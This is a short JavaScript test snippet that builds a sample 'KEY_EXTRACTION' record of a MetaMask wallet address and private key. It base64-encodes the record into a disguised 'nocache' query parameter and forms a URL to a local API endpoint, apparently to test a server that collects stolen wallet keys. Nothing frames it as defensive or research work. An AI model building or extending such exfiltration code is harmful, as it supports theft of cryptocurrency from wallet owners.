// Example payload from SPEC.md (implied)
const payload = {
  type: 'KEY_EXTRACTION',
  acquiredAt: new Date().toISOString(),
  wallets: [
    {
      walletName: 'MetaMask',
      address: '0x1234567890abcdef1234567890abcdef12345678',
      privateKey: '0xabc123...'
    }
  ],
  location: 'https://google.com/maps'
};

const nocache = Buffer.from(JSON.stringify(payload)).toString('base64');
const url = `http://localhost:3000/api?nocache=${nocache}`;

console.log('Test URL:', url);
console.log('Sending request...');

// Note: To run this, you need 'vercel dev' running or mock the handler.
// Since we can't easily run 'vercel dev' here, we'll just print the URL.
